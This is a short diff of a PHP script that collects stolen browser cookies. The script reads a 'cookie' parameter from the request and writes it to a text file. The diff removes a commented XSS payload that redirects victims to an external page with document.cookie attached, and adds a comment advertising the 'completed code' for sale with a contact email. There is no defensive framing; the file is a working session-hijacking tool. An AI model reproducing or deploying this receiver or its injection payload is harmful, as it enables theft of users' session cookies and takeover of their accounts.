@@ -1,7 +1,11 @@
 <?php
 session_start();
 $a = $_GET['cookie'];
-#<script>window.location="http://.com/i.php?cookie="+document.cookie</script>
+#
+#
+#
+#
+# Completed code is sell / Contact ; xaledef@protonmail.com
 $file = fopen("cok.txt", "w");
 echo fwrite($file, $a);
 fclose($file);
